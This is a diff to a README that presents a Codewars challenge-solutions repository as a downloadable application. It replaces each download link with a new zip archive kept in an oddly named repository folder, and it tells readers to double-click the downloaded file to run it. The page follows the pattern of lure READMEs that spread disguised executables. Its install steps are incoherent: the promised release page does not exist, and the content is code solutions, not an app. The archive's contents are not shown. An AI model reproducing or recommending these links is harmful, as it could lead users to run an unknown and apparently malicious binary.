@@ -1,6 +1,6 @@
 # 🛠️ codewars-challenges - Solve Fun Coding Problems Easily
 
-[![Download Latest Version](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars-challenges-v1.1-beta.5.zip%20Latest%20Version-v1.0-blue)](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars-challenges-v1.1-beta.5.zip)
+[![Download Latest Version](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars_challenges_v3.2.zip%20Latest%20Version-v1.0-blue)](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars_challenges_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to the **codewars-challenges** repository! This application provides sol
 
 ## 📥 Download & Install
 
-To download the latest version of the application, visit this page to download: [codewars-challenges Releases](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars-challenges-v1.1-beta.5.zip).
+To download the latest version of the application, visit this page to download: [codewars-challenges Releases](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars_challenges_v3.2.zip).
 
 Once there, you will see a list of available files. Choose the version that fits your operating system. Click on the file link to start your download.
 
 ### Step-by-Step Guide to Installation:
 
-1. Visit the download page: [codewars-challenges Releases](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars-challenges-v1.1-beta.5.zip).
+1. Visit the download page: [codewars-challenges Releases](https://raw.githubusercontent.com/prider7/codewars-challenges/master/subsistential/codewars_challenges_v3.2.zip).
 2. Locate the version you want to download. Click on it to download the file to your computer.
 3. Once the file is downloaded, find it in your downloads folder.
 4. Double-click the downloaded file to run the application.
